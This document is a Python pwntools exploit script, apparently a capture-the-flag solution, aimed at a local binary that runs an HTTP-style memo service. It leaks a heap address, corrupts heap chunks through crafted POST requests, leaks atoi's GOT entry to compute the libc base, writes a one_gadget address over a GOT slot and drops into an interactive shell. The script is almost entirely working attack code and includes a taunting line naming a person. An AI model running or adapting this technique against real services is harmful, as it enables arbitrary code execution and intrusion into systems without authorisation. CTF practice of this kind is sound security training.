from pwn import *
import urllib

p = process('./pwn')
libc = ELF('libc-so.6')
elf = ELF('pwn')
context.log_level = 'debug'

def add(content,index):
    s = 'POST '+'/add '+'Connection: keep-alive'
    s += '\n\n'+'memo='+content+'&count='+str(index)
    p.sendline(s)

def count():
    s = 'POST '+'/count '+'Connection: keep-alive'
    p.sendline(s)

def listlist():
    s = 'GET '+'/list '+'Connection: keep-alive'
    p.sendline(s)

add('A'*8,1)
add('B'*8,1)
add('C'*8,1)
add('D'*8,1)
add('E'*0x30,1)
add('F'*0x30,1)
add('G'*0x30,1)
add('H'*0x30,1)
add('F'*24,123456)
sleep(1)
count()
sleep(2)
listlist()

p.recvuntil('0</td>')
p.recvuntil('<td>')
data = p.recvuntil('<')
data = data[:-1]
data = u64(data.ljust(8,'\x00'))
heap_base = data - 0x20
log.success('heap addr is:'+hex(heap_base))

sleep(1)
add(p64(heap_base+0x60).replace('\x00',''),1)
count()
sleep(2)
add('aaaaaaaa\x21',1)
add('b'*8+'\x21'*8+p64(elf.got['atoi']).replace('\x00',''),12345)
listlist()

p.recvuntil('aaaaaaaa!</td><td>0</td></tr><tr><td>')
data2 = u64(p.recv(6).ljust(8,'\x00'))
atoi_addr = data2
libc_base = atoi_addr - libc.symbols['atoi']
one_gadget = libc_base + 0x45216
log.success('atoi addr is:'+hex(atoi_addr))
log.success('onegadget addr is:'+hex(one_gadget))

add(p64(heap_base+0x180).replace('\x00',''),1)
count()
sleep(2)
add(urllib.quote(flat(0x60306a).ljust(0x30, 'A')),1234)
add(urllib.quote(flat(0x60306a).ljust(0x30, 'A')),1234)
add(urllib.quote(flat(0x60306a).ljust(0x30, 'A')),1234)
add('A'*6+urllib.quote(flat(p64(one_gadget)).ljust(0x30-14, 'A')),1234)

sleep(0.1)
p.sendline('V1NKe is a stupid boy!')

p.interactive()
